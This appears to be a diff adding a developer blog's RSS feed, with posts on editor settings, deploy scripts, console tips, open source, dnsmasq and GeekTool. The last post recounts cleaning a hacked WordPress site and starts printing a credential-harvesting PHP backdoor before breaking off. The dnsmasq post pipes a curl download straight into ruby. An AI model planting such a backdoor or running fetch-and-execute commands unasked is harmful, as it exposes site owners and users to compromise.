+  &lt;span class=&quot;string&quot;&gt;&quot;font_face&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;Source Code Pro&quot;&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Current working font size&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;font_size&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;15.0&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Highlight the current line - makes it easier to focus and find where you are typing&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;highlight_line&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Make it obvious when I haven't saved something&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;highlight_modified_tabs&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Ignore VIM mode, it plays havoc with some of my other preferred shortcuts&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;ignored_packages&quot;&lt;/span&gt;: [
+    &lt;span class=&quot;string&quot;&gt;&quot;Vintage&quot;&lt;/span&gt;
+  ],
+  &lt;span class=&quot;comment&quot;&gt;// Draw all indent guides, but also draw the carets indent guide in a different color&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;indent_guide_options&quot;&lt;/span&gt;: [
+    &lt;span class=&quot;string&quot;&gt;&quot;draw_active&quot;&lt;/span&gt;,
+    &lt;span class=&quot;string&quot;&gt;&quot;draw_normal&quot;&lt;/span&gt;
+  ],
+  &lt;span class=&quot;comment&quot;&gt;// Removes the extra whitespace using `Source Sans Pro` comes with&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;line_padding_bottom&quot;&lt;/span&gt;: -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,
+  &lt;span class=&quot;string&quot;&gt;&quot;line_padding_top&quot;&lt;/span&gt;: -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Render a vertical ruler at the 80 character mark, tries to keep me considerate&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;rulers&quot;&lt;/span&gt;: [
+    &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;
+  ],
+  &lt;span class=&quot;comment&quot;&gt;// Saving everytime I lose focus causes all sorts of conflicts&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;save_on_focus_lost&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Always allow me to scroll beyond the last line&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;scroll_past_end&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Enable `shift + tab` to cause unindent&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;shift_tab_unindent&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Override tab size to equal 2 spaces&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;tab_size&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Beautiful and minimal theme - download at https://github.com/thinkpixellab/flatland&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;theme&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;Flatland Dark.sublime-theme&quot;&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Use spaces for indentation&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;translate_tabs_to_spaces&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Removes all the trailing white space on save&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;trim_trailing_white_space_on_save&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,
+  &lt;span class=&quot;comment&quot;&gt;// Wraps lines instead of enabling horizontal scroll&lt;/span&gt;
+  &lt;span class=&quot;string&quot;&gt;&quot;word_wrap&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;
+}
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Writing a Github Pages Deploy Script</title>
+      <link>http://www.armblog.pl/articles/writing-github-pages-deploy-script/</link>
+      <pubDate>Sun, 04  Aug 2013 20:40:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/writing-github-pages-deploy-script/</guid>
+      <author></author>
+      <description>&lt;p&gt;Lately I have found myself creating more and more sites of the static kind and deploying them Github Pages. Regularly, this would involve having a &lt;code&gt;public&lt;/code&gt; directory which contains all the assets before I build them (think preprocessor - SASS, Less, Stylus, Jade, Browserify, Requirejs) and another &lt;code&gt;build&lt;/code&gt; directory where these assets are compiled to during development, testing and deployment. I found myself doing this so often, I figured I’d better make a little Makefile script for me to easily deploy any directory to Github Pages.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;deploy:
+  @grunt build
+  @&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ./build &amp;amp;&amp;amp; git init . &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git commit -m \&lt;span class=&quot;string&quot;&gt;&quot;Deploy\&quot; &amp;amp;&amp;amp; \
+  git push &quot;&lt;/span&gt;git@github.com:blakeembrey/&amp;lt;repo&amp;gt;.git&lt;span class=&quot;string&quot;&gt;&quot; master:gh-pages --force &amp;amp;&amp;amp; rm -rf .git&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;All the script does is run the build, in this case &lt;code&gt;grunt build&lt;/code&gt; and initialises the &lt;code&gt;build&lt;/code&gt; directory as a git repository. It then commits all the directory contents and pushes it up to the Github Pages branch of a repo you define.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Improving Your JavaScript Console Skills</title>
+      <link>http://www.armblog.pl/articles/improve-dev-tools-console-workflow/</link>
+      <pubDate>Fri, 05 Jul 2013 10:00:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/improve-dev-tools-console-workflow/</guid>
+      <author></author>
+      <description>&lt;p&gt;&lt;em&gt;This article is meant as an introduction to some of the features of the JavaScript console. It is not all encompassing, but I will try to cover all the features I find myself using and others that I could not live without. All the features mentioned will be tailored to the Chrome Dev Tools, but I will try to mention any differences with other modern browsers.&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&quot;accessing-the-dev-tools&quot;&gt;Accessing the dev tools&lt;/h2&gt;
+&lt;p&gt;If you have never used the developer tools before, you may have problems finding them. The easiest and simplest way to access the developer tools is by using the keyboard shortcuts. On Mac, this is &lt;code&gt;Command + Option + I&lt;/code&gt;. On Windows, it’ll be &lt;code&gt;F12&lt;/code&gt;. In Safari, you’ll have to enable the developer tools under preferences first.&lt;/p&gt;
+&lt;p&gt;You can also inspect an element directly by right clicking and choosing &lt;code&gt;Inspect Element&lt;/code&gt;, and you can always access the dev tools from the menu shortcuts.&lt;/p&gt;
+&lt;h2 id=&quot;console-functions&quot;&gt;Console Functions&lt;/h2&gt;
+&lt;p&gt;The console global is an object that provides some useful shortcuts for debugging JavaScript. Arguably the most used function is &lt;code&gt;console.log&lt;/code&gt;, but did you know the console also provides &lt;code&gt;info&lt;/code&gt;, &lt;code&gt;warn&lt;/code&gt;, &lt;code&gt;debug&lt;/code&gt; and &lt;code&gt;error&lt;/code&gt; functions. They operate in the same way as the &lt;code&gt;log&lt;/code&gt; function, but the visual output will be altered and &lt;code&gt;error&lt;/code&gt; output an accompanying stack trace.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.armblog.pl/articles/improve-dev-tools-console-workflow/console-functions.png&quot; alt=&quot;Console Functions Demonstrated&quot;&gt;&lt;/p&gt;
+&lt;p&gt;All these functions accepts an unlimited number of parameters, and will be formatted for output in the console in different ways - depending on the object types there are. For example, DOM nodes will output as a representation of the node from the elements tab while array-like objects will appear as an array.&lt;/p&gt;
+&lt;p&gt;However, this added formatting convenience can sometimes be a pain. This is especially relevant when you want to see the underlying structure of a DOM node or an object. You may not even know it, but you have probably needed &lt;code&gt;console.dir&lt;/code&gt; at some point because it does exactly this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.armblog.pl/articles/improve-dev-tools-console-workflow/console-dir-vs-log.png&quot; alt=&quot;Difference between console.log and console.dir&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;manipulating-nodes-from-the-elements-tab&quot;&gt;Manipulating Nodes from the Elements Tab&lt;/h2&gt;
+&lt;p&gt;We’ve all been there - playing with a DOM node in the elements tab, but now we need to use JavaScript on it. We could do a regular DOM traversal to find it, but then we have to remember the ID or tag name, maybe even some obscure combination involving classes. If you switch to the Console tab on the Developer Tools, you can always grab the latest node you had selected using the &lt;code&gt;$0&lt;/code&gt; variable shortcut. In Chrome, this can even be expanded upon up to &lt;code&gt;$4&lt;/code&gt; - that’s the latest five elements you had selected.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$0&lt;/code&gt; - &lt;code&gt;$4&lt;/code&gt; are direct references to the DOM nodes, so you can start manipulating it directly by grabbing the inner text (&lt;code&gt;$0.innerText&lt;/code&gt;) or passing it to jQuery for manipulation (&lt;code&gt;$($0)&lt;/code&gt;). While on the subject, did you know Chrome also provides an alias to &lt;code&gt;document.querySelectorAll&lt;/code&gt; under &lt;code&gt;$$&lt;/code&gt; and &lt;code&gt;document.querySelector&lt;/code&gt; under &lt;code&gt;$&lt;/code&gt; (if jQuery hasn’t overwritten it of course).&lt;/p&gt;
+&lt;h2 id=&quot;other-useful-console-functions&quot;&gt;Other Useful Console Functions&lt;/h2&gt;
+&lt;p&gt;Don’t despair yet, Chrome still has a wealth of functions at your debugging disposal. For your timing purposes, there is &lt;code&gt;console.time&lt;/code&gt; and &lt;code&gt;console.timeEnd&lt;/code&gt;. Each accept a single string as the name of the timer to stop and start. Even cooler is &lt;code&gt;console.assert&lt;/code&gt;, which accepts two parameters - the check and a string - and logs an assertion failure with the string when the check is falsy.&lt;/p&gt;
+&lt;p&gt;An interesting addition is &lt;code&gt;console.table&lt;/code&gt;, which allows you to log an array of similar objects in a readable fashion. It accepts the array of objects as the first parameter, but also accepts a second parameter as the object keys you want to log.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.armblog.pl/articles/improve-dev-tools-console-workflow/console-table.png&quot; alt=&quot;Demonstrating console.table&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;using-the-console&quot;&gt;Using the Console&lt;/h2&gt;
+&lt;p&gt;Whenever you are working in the console, hitting &lt;code&gt;Enter&lt;/code&gt; will cause the content of the console to be evaluated and output to the screen. You can optionally use &lt;code&gt;Shift + Enter&lt;/code&gt; to work over multiple lines, then just use &lt;code&gt;Enter&lt;/code&gt; as usual to trigger evaluation. If you want to continue working on the code that was previously evaluated, just press the &lt;code&gt;Up&lt;/code&gt; arrow - just like using the command line. The result of the previous evaluation is even stored in the variable &lt;code&gt;$_&lt;/code&gt;, so you can use it in your next evaluation.&lt;/p&gt;
+&lt;h2 id=&quot;other-tips-and-tricks&quot;&gt;Other Tips and Tricks&lt;/h2&gt;
+&lt;p&gt;The Chrome console also provides a function called &lt;code&gt;monitorEvents&lt;/code&gt; that works exactly as described. It accepts an DOM node to monitor as the first argument and by default it’ll monitor and log all the events. Optionally, you could pass in the string &lt;code&gt;&amp;quot;mouse&amp;quot;&lt;/code&gt; or &lt;code&gt;&amp;quot;key&amp;quot;&lt;/code&gt; to log only mouse or keyboard based events.&lt;/p&gt;
+&lt;p&gt;Conveniently, Chrome also provides an &lt;code&gt;inspect&lt;/code&gt; method which I feel is almost the opposite to &lt;code&gt;$0&lt;/code&gt;. It will open the elements panel and focus on the element within the DOM tree. There is even a &lt;code&gt;copy&lt;/code&gt; method to copy stuff to your clipboard.&lt;/p&gt;
+&lt;p&gt;Somewhat less used, but Chrome also provides a &lt;code&gt;keys&lt;/code&gt; function - which maps to &lt;code&gt;Object.keys&lt;/code&gt; - and a &lt;code&gt;values&lt;/code&gt; function, which is the polar opposite of keys.&lt;/p&gt;
+&lt;p&gt;And if at some point you just feel like a chump using your mouse and clicking to clear the console, it’ll probably be welcome news that there is even a &lt;code&gt;clear&lt;/code&gt; function that can do it for you. And remember, you can always persist the console over page reloads by right clicking and selecting “Preserve Log upon Navigation”.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Contributing to Open Source</title>
+      <link>http://www.armblog.pl/articles/contributing-to-open-source/</link>
+      <pubDate>Wed, 03 Apr 2013 20:35:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/contributing-to-open-source/</guid>
+      <author></author>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;“Software is like sex; it’s better when it’s free.”&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Linus Torvalds&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Being able to contribute to open source is an awesome feeling. The feeling of having code which thousands, if not millions, of people will run everyday is enough to make you cringe. Surprisingly though, few people realize how empowering, yet simple, contributing to an open source project can be.&lt;/p&gt;
+&lt;p&gt;In this article I am going to run you through what my usual process looks like when issuing a pull request through GitHub, and what sort of things to expect.&lt;/p&gt;
+&lt;h2 id=&quot;first-steps&quot;&gt;First Steps&lt;/h2&gt;
+&lt;p&gt;The first thing you’ll need is an open source library or project that you are passionate about. Finding a library that fits this criteria can be difficult, but I am sure there are a dozen of projects you take for granted everyday. It’s unlikely you even realize how many issues some libraries have backlogged to work through.&lt;/p&gt;
+&lt;p&gt;Once you have found a project you are interested in contributing to, chances are it’s on GitHub. If it’s not on GitHub, repeat the previous step. For the purpose of this blog post, I’ll be running with &lt;a href=&quot;https://github.com/LearnBoost/stylus/issues/989&quot;&gt;this issue from Stylus&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/2n2R1S3M291X3V1k110C/CapturFiles_1.png&quot; alt=&quot;Stylus issue on GitHub&quot;&gt;&lt;/p&gt;
+&lt;p&gt;The first thing you’ll need to do is fork the repo. This is done by clicking the &lt;code&gt;Fork&lt;/code&gt; button in the top right of GitHub. Once you fork the repo, you’ll have your own personal copy of the original repo that you can do what you want with. From there, you’ll want to use you command line to clone the repo off GitHub.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/0s0V12453x0X3Z102i1Z/CapturFiles_3.png&quot; alt=&quot;Local Stylus Fork&quot;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git clone git@github.com:blakeembrey/stylus.git
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After cloning the repository, you’ll now have a local copy on your machine. My next step is usually to set up the &lt;code&gt;upstream&lt;/code&gt; repository link for pulling down code.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git remote add upstream git@github.com:LearnBoost/stylus.git
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The next step is to create a branch, normally based on the name or description of the issue you are trying to solve. You don’t want to make your changes in the &lt;code&gt;master&lt;/code&gt; branch as it will make future updates and pull requests more difficult to do.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git checkout -b media-query-colon
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that command, I’ll quickly create a new branch based off &lt;code&gt;master&lt;/code&gt; and switch to it. The first thing you’ll want to do before writing any code is try and find the test suite for the project (hopefully they have one). This is the most useful thing I find during development, especially when it’s a library I’m not entire familiar with. With Stylus, I know I can find the test script under the scripts section the &lt;code&gt;package.json&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;npm test
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/0f0x1n22031F3j3E060D/CapturFiles_4.png&quot; alt=&quot;Command Line after working through the previous steps&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;committing-your-work&quot;&gt;Committing your work&lt;/h2&gt;
+&lt;p&gt;Running the test script should quickly give an overview of how the library is constructed and the current status of the library. Most of the time, all tests should be passing - otherwise this would mean more bugs that need fixing.&lt;/p&gt;
+&lt;p&gt;After running the test script, I usually find it useful to whip up a new test based on the issue you are trying to solve - which will be failing initially. This is known as Test Driven Development (TDD), and will be crucial as you explore the core of some libraries. Make sure to add as many test cases to demostrate the issue and fix, which will also stop future regressions.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In lieu of a formal styleguide, take care to maintain the existing coding style.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;When contributing to someone elses library, you’ll want to make sure your coding style is matching the code which already exists. This is an important concept to understand, as it makes future commits easier to read through when all the code is consistent. &lt;a href=&quot;https://github.com/rwldrn/idiomatic.js/#all-code-in-any-code-base-should-look-like-a-single-person-typed-it-no-matter-how-many-people-contributed&quot;&gt;All code in any code-base should look like a single person typed it, no matter how many people contributed&lt;/a&gt;. You may find that some projects also include a &lt;a href=&quot;https://github.com/twitter/bootstrap/blob/master/CONTRIBUTING.md&quot;&gt;CONTRIBUTING.md&lt;/a&gt; file.&lt;/p&gt;
+&lt;p&gt;Somewhere during this time you’ll want to commit your changes. Next, we’ll want to push our changes back to the remote repository we cloned from earlier (&lt;code&gt;git push -u origin media-query-colon&lt;/code&gt;). This will create a new branch on the remote repo to track from. Once the code is pushed back up to GitHub, you can create a pull request from your repo back to the original (&lt;code&gt;upstream&lt;/code&gt;).&lt;/p&gt;
+&lt;h2 id=&quot;creating-a-pull-request&quot;&gt;Creating a pull request&lt;/h2&gt;
+&lt;p&gt;When creating the pull request, it is vital to provide a descriptive title and contents - anyone reading the issue should understand what your trying to achieve before reading any code. If there are similar issues or you were fixing an existing issue, make sure to take a note of the issue numbers in the issue description. You can even make a reference to another repo if it affects it - this shows the impact of your change and demostrates the priority of your patch.&lt;/p&gt;
+&lt;h2 id=&quot;keeping-it-relevant&quot;&gt;Keeping it relevant&lt;/h2&gt;
+&lt;p&gt;Chances are, by now there have been new commits created since you forked the repo, or perhaps your commit history for the issue is just getting a little unwieldly. Fortunately there is a simple utility built into git for this known as rebasing.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git checkout master
+git pull upstream master
+git checkout media-query-colon
+git rebase -i master # Interactively rebase
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://f.cl.ly/items/1k3N1Q1I282p3Y3J233L/CapturFiles_6.png&quot; alt=&quot;Rebase process&quot;&gt;&lt;/p&gt;
+&lt;p&gt;A rebase will rewrite your commit history, so you can squash commits together into a single commit and clean up all the changes you have made. It’ll also move the commits to be the lastest in the commit log. Because the history will be rewritten, next time you push you’ll probably need to use the force push flag which overrides the remote commit (&lt;code&gt;git push -f&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;Luckily, with the way GitHub works, any commits in the branch - new or old -  will be appended to your pull request. This makes is simple to quickly iterate on any issues raised by fellow developers or the project owner.&lt;/p&gt;
+&lt;h2 id=&quot;completion&quot;&gt;Completion&lt;/h2&gt;
+&lt;p&gt;Now you are likely done. Depending on the repo and repo owner(s), it could take anywhere from a few minutes to a few months for your pull request to be reviewed. It won’t always be perfect, and it may be denied. In the case of your pull request being denied, check out the feedback - it’ll usually be really useful and maybe even give you an idea of where to go from there. If not, there are always more repos in need of contributors.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Simplify Local Development with Dnsmasq</title>
+      <link>http://www.armblog.pl/articles/local-development-with-dnsmasq/</link>
+      <pubDate>Tue, 24 Apr 2012 07:28:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/local-development-with-dnsmasq/</guid>
+      <author></author>
+      <description>&lt;p&gt;Ever wanted to be able to set up your local domains instantly and never have to worry about your &lt;code&gt;/etc/hosts&lt;/code&gt; again? Me too! A bit of looking around and I discovered a wealth of information about a small &lt;em&gt;DNS Forwarder&lt;/em&gt; called DNSMASQ.&lt;/p&gt;
+&lt;p&gt;So, this is great. We have our solution - it’s a tiny program barely taking 700KB of RAM, and it’s a cinch to set up. By the end of this post, you will have a working TLD for use with your local development applications. No more playing with your &lt;code&gt;/etc/hosts&lt;/code&gt; file every time you want to add a new domain.&lt;/p&gt;
+&lt;p&gt;In this tutorial, I will be focusing on Mac as it is the OS I use, however, the instructions should be fairly similar on linux. It has been tested in Mountain Lion and should work without a hiccup all the way down to Leopard (probably lower).&lt;/p&gt;
+&lt;p&gt;First of all, if you haven’t installed it already, we will install &lt;strong&gt;homebrew&lt;/strong&gt; - the missing package manager for OS X. To install, just follow the instructions available on &lt;a href=&quot;http://mxcl.github.com/homebrew/&quot;&gt;the homepage&lt;/a&gt; or just copy and paste this snippet into terminal:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/usr/bin/ruby -e &amp;quot;$(/usr/bin/curl -fksSL https://raw.github.com/mxcl/homebrew/master/Library/Contributions/install_homebrew.rb)&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once brew is installed, we’ll install dnsmasq using &lt;code&gt;brew install dnsmasq&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Next, let’s activate dnsmasq. Homebrew should have output some hints on how to get started, but in case you missed it  should be something along these lines.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cp /usr/local/Cellar/dnsmasq/2.57/dnsmasq.conf.example /usr/local/etc/dnsmasq.conf
+sudo cp /usr/local/Cellar/dnsmasq/2.57/homebrew.mxcl.dnsmasq.plist /Library/LaunchDaemons
+sudo launchctl load -w /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Brilliant, now let’s modify our configuration file at &lt;code&gt;/usr/local/etc/dnsmasq.conf&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;We’ll add two rules. The first is the address, or TLD, we will listen to. In this case we will use &lt;code&gt;.dev&lt;/code&gt;, but you can use anything (except &lt;code&gt;.local&lt;/code&gt; - &lt;a href=&quot;http://www.justincarmony.com/blog/2011/07/27/mac-os-x-lion-etc-hosts-bugs-and-dns-resolution/&quot;&gt;not a good idea&lt;/a&gt;)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;address=/dev/127.0.0.1
+listen-address=127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To start and stop dnsmasq, simply use&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo launchctl stop homebrew.mxcl.dnsmasq &amp;amp;&amp;amp; sudo launchctl start homebrew.mxcl.dnsmasq
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, I found it even easier to just kill the script in the Activity Monitor. For the final step, add &lt;code&gt;127.0.0.1&lt;/code&gt; as a name server in &lt;code&gt;System Preferences -&amp;gt; Network -&amp;gt; Advanced -&amp;gt; DNS&lt;/code&gt;. You can add it along with some other DNS records, just make sure it’s at the top. For example, I use Google’s Public DNS - &lt;code&gt;8.8.8.8&lt;/code&gt; and &lt;code&gt;8.8.4.4&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now in whichever language you are writing in, you should be able to easily set up your virtual hosts for use on the &lt;code&gt;.dev&lt;/code&gt; TLD. You should be even able to see your name server setup using &lt;code&gt;scutil --dns&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://serverfault.com/a/164215&quot;&gt;ServerFault Question&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://blog.philippklaus.de/2012/02/install-dnsmasq-locally-on-mac-os-x-via-homebrew/&quot;&gt;Install DNSmasq locally on Mac OS X via Homebrew&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    <item>
+      <title>Change Desktop Background with Shell and GeekTool</title>
+      <link>http://www.armblog.pl/articles/geektool-change-desktop-background/</link>
+      <pubDate>Sun, 30 Oct 2011 12:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/geektool-change-desktop-background/</guid>
+      <author></author>
+      <description>&lt;p&gt;Make an AppleScript and run it using the “Shell” geeklet provided in GeekTool. First, we’ll make the ‘AppleScript’. So, open the AppleScript Editor app to get started. Copy and paste this code:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;tell application &amp;quot;Finder&amp;quot;
+  set desktop picture to POSIX file &amp;quot;file://localhost/  yourimage.png&amp;quot;
+end tell
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, replace &lt;code&gt;file://localhost/yourimage.png&lt;/code&gt; with the location to your image. It must be an absolute path to the image, so you might want to make a folder just for your GeekTool scripts somewhere. For example, I want to use the Tron background image, so I used &lt;code&gt;file://localhost/Users/blakeembrey/Dropbox/Application Settings/GeekTool/TronLegacy.png&lt;/code&gt;. I am currently storing my GeekTool scripts in an ‘Applications’ folder inside my documents, as you can see. Once I finished that, I saved the script as &lt;code&gt;setTronBackground&lt;/code&gt; in the same folder.&lt;/p&gt;
+&lt;p&gt;Now in Geektool, drag the shell geeklet to the desktop from GeekTool. It doesn’t matter where it goes since it isn’t going to be seen anyway. Set the ‘group’ you would like it to be a part of, then set the ‘Refresh Every’ to 0. For the shell code, we are going to use something like&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;osascript ~/Documents/Applications/GeekTool/setTronBackground.scpt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notice we can use the relative location here, and that we need .scpt for the file extension. Finally, save and close GeekTool. Now every time you change the theme you will also change the background image.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Warning - Something's Not Right Here</title>
+      <link>http://www.armblog.pl/articles/warning-somethings-not-right/</link>
+      <pubDate>Fri, 30 Sep 2011 12:00:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/warning-somethings-not-right/</guid>
+      <author></author>
+      <description>&lt;p&gt;&lt;img src=&quot;http://d.pr/i/Ap8y+&quot; alt=&quot;Chrome is broken :/&quot;&gt;&lt;/p&gt;
+&lt;p&gt;About two days ago, I received a warning from Google saying my website has been exploited and hacked. Of course, the emails they sent I never received, so I didn’t realise I had an issue until about an hour ago. My first reaction was OMG, WTF! I knew it most likely had something to do with the recent TimThumb exploit, but I didn’t even know my theme had TimThumb included. I also looked at the Google diagnostic repost which it linked me to, which I found the malware related to &lt;code&gt;counter-wordpress.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;First of all, I would advise running the script found at &lt;a href=&quot;http://blog.sucuri.net/2011/08/timthumb-php-security-vulnerability-just-the-tip-of-the-iceberg.html&quot;&gt;Sucuri&lt;/a&gt;. Then, scan your site using the &lt;a href=&quot;http://sitecheck.sucuri.net/scanner/&quot;&gt;Sucuri Site Scanner&lt;/a&gt; to find out which pages they have exploited and how. This is the best little site I have found for this, and I would definitely bookmark it for future refernce as well if I were you.&lt;/p&gt;
+&lt;p&gt;Extremely quickly, I jumped to action. This is the exact steps I took and you can take too, to remove the exploits from your code:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Delete the following files:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;wp-admin/upd.php
+wp-content/upd.php
+&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
+&lt;li&gt;Log into WordPress admin and reinstall your WordPress version. We are focusing on these three files:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;wp-settings.php
+wp-includes/js/jquery/jquery.js
+wp-includes/js/l10n.js
+&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
+&lt;li&gt;Open “&lt;code&gt;wp-config.php&lt;/code&gt;“ and look for anything that seems out of place. In mine, I found a script which appears to harvest login credentials/cookies, which found on the 2000 or so line. Above and a few thousand lines below were all blank:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;])&amp;amp;&amp;amp; &lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pass'&lt;/span&gt;])){
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pass'&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;'19ca14e7ea6328a42e0eb13d585e4c22'&lt;/span&gt;){
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;string&quot;&gt;'login'&lt;/span&gt;){
